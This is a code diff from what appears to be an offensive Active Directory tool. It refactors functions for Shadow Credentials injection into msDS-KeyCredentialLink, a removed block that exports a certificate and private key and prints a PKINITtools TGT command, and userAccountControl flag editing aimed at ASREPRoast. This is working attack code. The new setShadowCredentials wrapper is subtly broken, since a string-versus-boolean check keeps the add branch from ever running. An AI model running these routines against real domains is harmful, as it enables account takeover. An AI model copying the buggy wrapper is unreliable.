@@ -1,6 +1,4 @@
 import ldap3
-import random
-import string
 import types
 import re
 import json
@@ -8,17 +6,13 @@ from .addcomputer import ADDCOMPUTER
 from functools import wraps
 
 from ldap3.extend.microsoft import addMembersToGroups, modifyPassword, removeMembersFromGroups
-from dsinternals.system.Guid import Guid
-from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
-from dsinternals.system.DateTime import DateTime
-from dsinternals.common.data.hello.KeyCredential import KeyCredential
-from impacket.ldap import ldaptypes
-from impacket.dcerpc.v5 import samr, dtypes
+from impacket.dcerpc.v5 import dtypes
 
 from .exceptions import BloodyError, ResultError, NoResultError
 from .utils import resolvDN, getDefaultNamingContext
 from .utils import rpcChangePassword
-from .utils import userAccountControl, modifySecDesc
+from .utils import modifySecDesc
+from .utils import addShadowCredentials, delShadowCredentials
 from .utils import LOG
 
 
@@ -33,20 +27,6 @@ def register_module(f):
         return f(*args, **kwds)
 
     return wrapper
-
-
-@register_module
-def getGroupMembers(conn, identity):
-    """
-    Return the list of member for a group whose identity is given as parameter
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the target
-    """
-    ldap_conn = conn.getLdapConnection()
-    group_dn = resolvDN(ldap_conn, identity)
-    ldap_conn.search(group_dn, '(objectClass=group)', search_scope=ldap3.BASE, attributes='member')
-    LOG.info(ldap_conn.response_to_json())
-    return ldap_conn.entries[0]['attributes']['member']
 
 
 @register_module
@@ -65,18 +45,9 @@ def getObjectAttributes(conn, identity, attr='*', fetchSD="False"):
         # If SACL is asked the server will not return the nTSecurityDescriptor for a standard user because it needs privileges
         control_flag = dtypes.OWNER_SECURITY_INFORMATION + dtypes.GROUP_SECURITY_INFORMATION + dtypes.DACL_SECURITY_INFORMATION
     controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=control_flag)
-    ldap_conn.search(dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=attr.split(','), controls=controls)
+    ldap_conn.search(dn, "(objectClass=*)", search_scope=ldap3.BASE, attributes=attr.split(','), controls=controls)
     LOG.info(ldap_conn.response_to_json())
     return ldap_conn.response[0]['attributes']
-
-def getDefaultPasswordPolicy(conn):
-    """
-    """
-    ldap_conn = conn.getLdapConnection()
-    domain_dn = getDefaultNamingContext(ldap_conn)
-    ldap_conn.search(domain_dn, '(objectClass=domain)', search_scope=ldap3.BASE, attributes='minPwdLength')
-    LOG.info(ldap_conn.response_to_json())
-    return ldap_conn.response[0]['attributes']['minPwdLength']
 
 
 @register_module
@@ -92,6 +63,7 @@ def setAttribute(conn, identity, attribute, value):
     ldap_conn = conn.getLdapConnection()
     dn = resolvDN(ldap_conn, identity)
     ldap_conn.modify(dn, {attribute: [ldap3.MODIFY_REPLACE, value]})
+
 
 @register_module
 def addUser(conn, sAMAccountName, password, ou=None):
@@ -124,6 +96,7 @@ def addUser(conn, sAMAccountName, password, ou=None):
     else:
         LOG.error(sAMAccountName + ': ' + ldap_conn.result['description'])
         raise BloodyError(ldap_conn.result['description'])
+
 
 @register_module
 def addComputer(conn, hostname, password, ou=None):
@@ -248,119 +221,32 @@ def delObjectFromGroup(conn, member, group):
 
 
 @register_module
-def getObjectsInOu(conn, base_ou, object_type='*'):
+def getChildObjects(conn, parent_obj, object_type='*'):
     """
-    List the object present in an organisational unit
+    List the child objects of an object
     Args:
-        base_ou: DN of the targeted OU
+        base_obj: DN of the targeted parent object
         object_type: the type of object to fetch (user/computer or * to have them all)
     """
     ldap_conn = conn.getLdapConnection()
-    ldap_conn.search(base_ou, f'(objectClass={object_type})')
+    ldap_conn.search(parent_obj, f'(objectClass={object_type})')
     res = [entry['dn'] for entry in ldap_conn.response if entry['type'] == 'searchResEntry']
+    for child in res:
+        LOG.info(child)
     return res
 
-
 @register_module
-def getOusInOu(conn, base_ou):
+def setShadowCredentials(conn, identity, enable="True", outfilePath=None):
     """
-    List the organisational units present in an organisational unit
-    Args:
-        base_ou: DN of the targeted OU
-    """
-    containers = getObjectsInOu(conn, base_ou, "container")
-    for container in containers:
-        LOG.info(container)
-    return containers
-
-
-@register_module
-def getUsersInOu(conn, base_ou):
-    """
-    List the user present in an organisational unit
-    Args:
-        base_ou: DN of the targeted OU
-    """
-    users = getObjectsInOu(conn, base_ou, "user")
-    for user in users:
-        LOG.info(user)
-    return users
-
-
-@register_module
-def getComputersInOu(conn, base_ou):
-    """
-    List the computers present in an organisational unit
-    Args:
-        base_ou: DN of the targeted OU
-    """
-    computers = getObjectsInOu(conn, base_ou, "computer")
-    for computer in computers:
-        LOG.info(computer)
-    return computers
-
-
-@register_module
-def addShadowCredentials(conn, identity, outfilePath=None):
-    """
-    Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
+    Add ord delete attribute allowing to authenticate as the user provided using a crafted certificate (Shadow Credentials)
     Args:
         identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
         outfilePath: file path for the generated certificate (default is current path)
     """
-    ldap_conn = conn.getLdapConnection()
-    target_dn = resolvDN(ldap_conn, identity)
-
-    LOG.debug("Generating certificate")
-    certificate = X509Certificate2(subject=identity, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
-    LOG.debug("Certificate generated")
-    LOG.debug("Generating KeyCredential")
-    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
-    LOG.debug("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
-    LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
-
-    ldap_conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['msDS-KeyCredentialLink'])
-
-    new_values = ldap_conn.response[0]['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
-    LOG.debug(new_values)
-    LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % identity)
-    ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
-    
-    if ldap_conn.result['result'] == 0:
-        LOG.debug("msDS-KeyCredentialLink attribute of the target object updated")
-        if outfilePath is None:
-            path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
-            LOG.info("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
-        else:
-            path = outfilePath
-
-        certificate.ExportPEM(path_to_files=path)
-        LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
-        LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
-        LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
-        LOG.info("Run the following command to obtain a TGT")
-        LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', identity, path))
-
+    if enable == True:
+        addShadowCredentials(conn, identity, outfilePath)
     else:
-        raise ResultError(ldap_conn.result)
-
-
-@register_module
-def delShadowCredentials(conn, identity):
-    """
-    Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCredentialLink attribute of the user provided
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
-    """
-    ldap_conn = conn.getLdapConnection()
-    target_dn = resolvDN(ldap_conn, identity)
-
-    # TODO: remove only the public key corresponding to the certificate provided
-    ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
-    if ldap_conn.result['result'] == 0:
-        LOG.info("msDS-KeyCredentialLink attribute of the target object updated")
-    else:
-        raise ResultError(ldap_conn.result)
+        delShadowCredentials(conn, identity)
 
 
 @register_module
@@ -420,24 +306,32 @@ def setDCSync(conn, identity, enable='True'):
 
         
 @register_module
-def setDontReqPreauthFlag(conn, identity, enable="True"):
+def setUserAccountControl(conn, identity, flags, enable="True"):
     """
-    Enable or disable the DONT_REQ_PREAUTH flag for the given user in order to perform ASREPRoast
-    You must have a write permission on the UserAccountControl attribute of the target user
+    Enable or disable the flags for the given user (must have a write permission on the UserAccountControl attribute of the target user)
     Args:
         identity: sAMAccountName, DN, GUID or SID of the target
-        enable: True to enable DontReqPreAuth for the identity or False to disable it (default is True)
+        flags: hexadecimal value corresponding to flags to set (e.g for DONT_REQ PREAUTH: 0x400000)
+        enable: True to add the flags or False to delete them (default is True)
     """
-    userAccountControl(conn, identity, enable, samr.UF_DONT_REQUIRE_PREAUTH)
+    enable = enable == "True"
+    flags = int(flags,16)
+    
+    conn = conn.getLdapConnection()
+    user_dn = resolvDN(conn, identity)
+    conn.search(user_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes='userAccountControl')
+    userAccountControl = conn.response[0]['attributes']['userAccountControl']
+    LOG.debug(f"Original userAccountControl: {userAccountControl}")
 
+    if enable:
+        userAccountControl = userAccountControl | flags
+    else:
+        userAccountControl = userAccountControl & ~flags
 
-@register_module
-def setAccountDisableFlag(conn, identity, enable="False"):
-    """
-    Enable or disable the target account by setting the ACCOUNTDISABLE flag in the UserAccountControl attribute
-    You must have write permission on the UserAccountControl attribute of the target
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the target
-        enable: True to enable the identity or False to disable it (default is False)
-    """
-    userAccountControl(conn, identity, enable, samr.UF_ACCOUNTDISABLE)
+    LOG.debug(f"Updated userAccountControl: {userAccountControl}")
+    conn.modify(user_dn, {'userAccountControl': (ldap3.MODIFY_REPLACE, [userAccountControl])})
+
+    if conn.result['result'] == 0:
+        LOG.info("Updated userAccountControl attribute successfully")
+    else:
+        raise ResultError(conn.result)
